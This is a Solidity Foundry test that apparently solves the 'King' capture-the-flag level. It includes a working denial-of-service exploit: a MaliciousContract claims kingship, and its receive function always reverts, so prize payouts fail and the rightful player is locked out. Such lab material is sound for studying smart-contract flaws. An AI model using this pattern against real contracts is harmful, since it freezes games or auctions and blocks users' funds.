// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// import {Test} from "forge-std/Test.sol";
import "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/console.sol";

import {King} from "../src/level10.sol";

contract KingTest is Test {
    King king;
    address attacker;
    address player;
    uint256 constant INITIAL_PRIZE = 1 ether;

    function setUp() public {
        player = address(0x123);
        attacker = address(0x456);

        // Deploy the contract with initial prize money
        vm.deal(player, 10 ether); // Give player some ETH
        vm.deal(attacker, 10 ether); // Give attacker some ETH
        vm.prank(player); // Act as player
        king = new King{value: INITIAL_PRIZE}();
    }

    function test_attack() public {
        vm.prank(attacker); // Attacker calls the function
        (bool success, ) = address(king).call{value: 2 ether}("");
        assertTrue(success, "Attack failed"); // Ensure attack succeeds

        // Attacker is now king
        assertEq(king._king(), attacker, "Attacker is not king");

        // Deploy a malicious contract that will block transfers
        MaliciousContract malicious = new MaliciousContract{value: 3 ether}(
            king
        );
        assertEq(
            king._king(),
            address(malicious),
            "Malicious contract is not king"
        );

        // Try reclaiming kingship (should fail)
        vm.prank(player);
        (bool reclaimSuccess, ) = address(king).call{value: 4 ether}("");
        assertFalse(
            reclaimSuccess,
            "Player should not be able to reclaim kingship"
        );
    }
}

// Malicious contract that prevents receiving ETH
contract MaliciousContract {
    constructor(King _king) payable {
        payable(address(_king)).transfer(msg.value); // Become king
    }

    receive() external payable {
        revert("Cannot transfer ETH"); // Block prize payments
    }
}
